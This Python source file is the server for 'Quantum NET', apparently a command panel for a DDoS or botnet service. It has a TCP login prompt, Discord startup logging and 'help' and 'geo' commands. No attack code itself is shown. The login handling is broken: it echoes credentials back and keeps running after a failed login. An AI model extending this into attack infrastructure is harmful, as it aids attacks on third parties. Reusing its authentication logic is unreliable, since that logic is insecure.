#
#
#@title: Quantum NET
#@since: 5/18/21
#@creator: Quantum Security Team (vl0b, Exo, clever, Max)
#
#

## Modules
import socket, sys, os, requests, time, threading, requests, random, datetime

## Files
from assets.Config.main import *
from assets.Config.current import *
from assets.Auth.main import *
from assets.Auth.crud import *
from assets.Auth.crudFunc import *
from assets.Logger.main import *
from assets.Logger.discord import *
from assets.banner_system.modify import *
from assets.utils.main import utils

## Commands
from assets.Commands.help import *
from assets.Commands.methods import *
from assets.Commands.geo import *

# if utils.GetOS() == True:
#         if utils.CheckForPython3Unix() == True:
#                 print("Thanks for using python3!")
#         else:
#                 print("Must use Python3!\r\nUsage: python3 " + sys.argv[0])
#                 exit()
# else:
#         print("This is currently for LINUX!")
#         exit()


buffer_length = 1024
host = "0.0.0.0"
port = random.randint(0, 65535)
timenow = datetime.datetime.now() # current time
if len(sys.argv) == 2:
        if sys.argv[1] == "-on":
                host = requests.get("https://api.ipify.org").text

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Try To Reuse Port Bypass TIME_WAIT Sometimes
sock.bind((host, port))
sock.listen()

print(f"Quantum Started | {host} | {port}")
DiscordFunc.netStartUp(host, port, timenow)

def handle_connection(client, addr):
        utils.set_Title(client, "Login")


        ## User Input Login Section
        client.send("Username: ".encode())
        username = client.recv(1024).decode().strip().replace("\r\n", "")
        # client.recv(1024).decode()
        client.send("Password: ".encode())
        password = client.recv(1024).decode().strip().replace("\r\n", "")

        client.send(f"{username} | {password}\r\n".encode())
        client.send("Welcome to Quantum Net\r\n".encode())

        if "[+]" in Auth.Login(username, password, addr[0]):
                client.send(f"Welcome: {username}".encode())
        else:
                client.send("[x] Error, Incorrect username or password. Try again....".encode())
                time.sleep(4)
                client.close()

        utils.set_Title(client, f"Quantum NET | User: {username}")

        while(True):
                client.send(Strings.hostname(username).encode())
                data = str(client.recv(buffer_length).decode()).strip().replace("\r\n", "")

                ## Command Handling
                if data != "\r\n":
                        Current.CurrentCmd["args"] = data.split(" ")
                        Current.CurrentCmd["fullcmd"] = data
                
                if data.lower() == "help":
                        help_command(client)
                elif data.lower().startswith("geo"):
                        geo_command(client, Current.CurrentCmd["args"])

                MainLogger.Log("CMD", True)
                client.send(Strings.hostname(username).encode())
        

def listener():
    while True:
        client, address = sock.accept()
        threading.Thread(target=handle_connection, args=(client,address)).start()
        print(Strings.MainColors['Red'] + "TCP Connection From " + address[0] + ":" + str(address[1]) + Strings.MainColors['Reset'])
threading.Thread(target=listener).start()
